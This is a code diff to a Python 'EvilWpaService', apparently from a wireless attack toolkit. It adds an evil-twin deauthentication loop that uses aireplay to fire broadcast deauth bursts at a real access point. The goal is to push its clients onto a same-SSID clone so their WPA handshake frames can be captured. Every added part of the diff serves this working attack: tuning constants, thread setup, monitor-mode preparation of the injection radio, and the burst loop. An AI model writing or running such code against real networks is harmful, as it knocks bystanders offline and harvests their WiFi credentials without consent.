@@ -61,6 +61,13 @@ _EXTRACT_INTERVAL = 30.0
 # unbounded growth on a long-running session with lots of traffic.
 _PCAP_ROTATE_BYTES = 20 * 1024 * 1024
 
+# ---------- Evil-twin deauth coupling tuning ----------
+# Broadcast deauth bursts at the REAL AP to dislodge its clients so they
+# re-associate — some land on our same-SSID clone and hand us M1+M2.
+_DEAUTH_INTERVAL = 5.0          # seconds between bursts
+_DEAUTH_COUNT_PER_BURST = 10    # aireplay --deauth N (one burst = ~64 frames)
+_DEAUTH_INITIAL_WAIT = 3.0      # let hostapd + the sniffer settle first
+
 
 # ---------- The service ----------
 
@@ -78,7 +85,12 @@ class EvilWpaService:
         # Threads
         self._sniffer_thread: threading.Thread | None = None
         self._extractor_thread: threading.Thread | None = None
+        self._deauth_thread: threading.Thread | None = None
         self._stop_event = threading.Event()
+        # Evil-twin deauth coupling (set on start)
+        self._deauth_enabled: bool = False
+        self._deauth_iface: str | None = None
+        self._deauth_bssid: str | None = None
         # Session config (set on start)
         self._iface: str | None = None
         self._channel: int | None = None
@@ -96,6 +108,7 @@ class EvilWpaService:
             "extract_runs":       0,
             "partials_extracted": 0,
             "pcap_bytes":         0,
+            "deauth_bursts":      0,
             "started_at":         None,
             "stopped_at":         None,
         }
@@ -122,6 +135,10 @@ class EvilWpaService:
                 "extract_runs":       self._stats["extract_runs"],
                 "partials_extracted": self._stats["partials_extracted"],
                 "pcap_bytes":         self._stats["pcap_bytes"],
+                "deauth_enabled":     self._deauth_enabled,
+                "deauth_bssid":       self._deauth_bssid,
+                "deauth_iface":       self._deauth_iface,
+                "deauth_bursts":      self._stats["deauth_bursts"],
                 "started_at":         self._stats["started_at"],
                 "stopped_at":         self._stats["stopped_at"],
             }
@@ -133,12 +150,24 @@ class EvilWpaService:
 
     def start(
         self, iface: str, channel: int, ap_bssid: str, ssid: str,
+        *,
+        deauth_enabled: bool = False,
+        deauth_iface: str | None = None,
+        deauth_bssid: str | None = None,
     ) -> tuple[bool, str]:
         """Bind to ``iface`` (monitor mode), lock to ``channel`` (must
         match hostapd's), start the EAPOL sniffer + periodic
         extractor. Caller (pineap._start_broadcast) is responsible
         for ensuring iface is monitor-mode and recon has been paused
         on it — same coordination as Karma.
+
+        Optional evil-twin deauth coupling: when ``deauth_enabled`` and
+        a ``deauth_bssid`` (the REAL AP's BSSID) + ``deauth_iface`` (the
+        spare injection radio, e.g. wlan-mon-2g) are supplied, also
+        spawn a loop firing broadcast deauth bursts at the real AP to
+        push its clients onto our same-SSID clone. No-op against
+        MFP-required targets (frames rejected); caller warns the
+        operator.
 
         Stub mode just flips lifecycle state without touching the
         radio."""
@@ -149,6 +178,10 @@ class EvilWpaService:
             self._channel  = int(channel)
             self._ap_bssid = ap_bssid.lower()
             self._ssid     = ssid
+            self._deauth_enabled = bool(deauth_enabled and deauth_bssid and deauth_iface)
+            self._deauth_iface   = deauth_iface if self._deauth_enabled else None
+            self._deauth_bssid   = (deauth_bssid.lower()
+                                    if self._deauth_enabled and deauth_bssid else None)
             self._session_id = uuid.uuid4().hex[:12]
             self._session_dir = self._evil_wpa_dir / f"{self._session_id}"
             self._session_dir.mkdir(parents=True, exist_ok=True)
@@ -162,6 +195,7 @@ class EvilWpaService:
                 "extract_runs":       0,
                 "partials_extracted": 0,
                 "pcap_bytes":         0,
+                "deauth_bursts":      0,
                 "started_at":         time.time(),
                 "stopped_at":         None,
             })
@@ -218,23 +252,46 @@ class EvilWpaService:
                 if ctx:
                     ctx.pop()
 
+        def _run_deauth() -> None:
+            ctx = app.app_context() if app is not None else None
+            if ctx:
+                ctx.push()
+            try:
+                self._deauth_loop()
+            except Exception:
+                log.exception("evil_wpa deauth loop crashed")
+            finally:
+                if ctx:
+                    ctx.pop()
+
         t_sniff = threading.Thread(target=_run_sniffer,
                                    name=f"evil-wpa-sniff-{iface}",
                                    daemon=True)
         t_extract = threading.Thread(target=_run_extractor,
                                      name=f"evil-wpa-extract-{self._session_id}",
                                      daemon=True)
+        t_deauth = None
+        if self._deauth_enabled:
+            t_deauth = threading.Thread(
+                target=_run_deauth,
+                name=f"evil-wpa-deauth-{self._session_id}",
+                daemon=True)
         with self._lock:
             self._sniffer_thread = t_sniff
             self._extractor_thread = t_extract
+            self._deauth_thread = t_deauth
         t_sniff.start()
         t_extract.start()
-        log.info("evil_wpa: listening on %s ch%d for AP %s (%r) session=%s",
+        if t_deauth is not None:
+            t_deauth.start()
+        deauth_note = (f" + evil-twin deauth at {self._deauth_bssid} "
+                       f"on {self._deauth_iface}") if self._deauth_enabled else ""
+        log.info("evil_wpa: listening on %s ch%d for AP %s (%r) session=%s%s",
                  iface, self._channel, self._ap_bssid, self._ssid,
-                 self._session_id)
+                 self._session_id, deauth_note)
         return True, (f"evil_wpa listening on {iface} ch{self._channel} "
                       f"for {self._ap_bssid} ({self._ssid!r}) "
-                      f"session={self._session_id}")
+                      f"session={self._session_id}{deauth_note}")
 
     def stop(self) -> tuple[bool, str]:
         with self._lock:
@@ -243,8 +300,9 @@ class EvilWpaService:
             self._stop_event.set()
             self._stats["stopped_at"] = time.time()
 
-        # Wait for both threads to exit so callers can free the radio
-        for t in (self._sniffer_thread, self._extractor_thread):
+        # Wait for all threads to exit so callers can free the radios
+        for t in (self._sniffer_thread, self._extractor_thread,
+                  self._deauth_thread):
             if t is not None:
                 t.join(timeout=3.0)
 
@@ -269,6 +327,7 @@ class EvilWpaService:
             stale_extractor = self._extractor_thread
             self._sniffer_thread = None
             self._extractor_thread = None
+            self._deauth_thread = None
         if stale_sniffer is not None and stale_sniffer.is_alive():
             log.warning("evil_wpa sniffer didn't exit within 3s — leaked")
         if stale_extractor is not None and stale_extractor.is_alive():
@@ -480,6 +539,66 @@ class EvilWpaService:
             "extracted_at":   time.time(),
             "source":         "Evil WPA",
         }
+
+    # ---------- Evil-twin deauth coupling ----------
+    def _deauth_loop(self) -> None:
+        """Fire broadcast deauth bursts at the REAL AP on the spare radio
+        while the engine runs. Dislodged clients re-associate; some land
+        on our same-SSID clone and start the 4-way we harvest.
+
+        We own the injection iface here: put it in monitor mode + pin it
+        to the target channel before the first burst (recon was paused by
+        the caller, so the radio is free). All radio ops self-stub on Mac
+        dev. Best-effort throughout — a failed burst is logged, never
+        fatal."""
+        iface = self._deauth_iface
+        bssid = self._deauth_bssid
+        if not iface or not bssid:
+            return
+
+        from app.tools._common import stub_mode
+        from app.tools import aireplay
+
+        # Prep the injection radio: monitor + locked channel. recon's
+        # stop leaves the monitor adapters in monitor mode already, but
+        # be defensive — set_mode is idempotent and self-stubs.
+        if not stub_mode():
+            try:
+                from app.services.adapters import get_service as get_adapters
+                from app.tools import iw, nm
+                nm.set_managed(iface, managed=False)
+                ok, mode_msgs = get_adapters().set_mode(iface, "monitor")
+                if not ok:
+                    log.warning("evil_wpa deauth: set_mode monitor on %s "
+                                "failed: %s", iface, "; ".join(mode_msgs))
+                ok, msg = iw.set_channel(iface, int(self._channel))
+                if not ok:
+                    log.warning("evil_wpa deauth: set_channel %s ch%d: %s",
+                                iface, self._channel, msg)
+            except Exception:
+                log.exception("evil_wpa deauth: injection-iface prep failed")
+
+        log.info("evil_wpa deauth: broadcast bursts at %s via %s ch%d",
+                 bssid, iface, self._channel)
+        # Let hostapd + the sniffer settle before kicking the air.
+        self._stop_event.wait(_DEAUTH_INITIAL_WAIT)
+        while not self._stop_event.is_set():
+            try:
+                ok, msg = aireplay.send_deauth(
+                    iface, bssid, client_mac=None,
+                    count=_DEAUTH_COUNT_PER_BURST,
+                )
+                if ok:
+                    with self._lock:
+                        self._stats["deauth_bursts"] += 1
+                    log.debug("evil_wpa deauth burst #%d at %s: %s",
+                              self._stats["deauth_bursts"], bssid, msg)
+                else:
+                    log.warning("evil_wpa deauth burst failed: %s", msg)
+            except Exception:
+                log.exception("evil_wpa deauth burst threw")
+            self._stop_event.wait(_DEAUTH_INTERVAL)
+        log.info("evil_wpa deauth loop exiting (%s)", bssid)
 
     def _emit_partial(self, partial: dict[str, Any]) -> None:
         try:
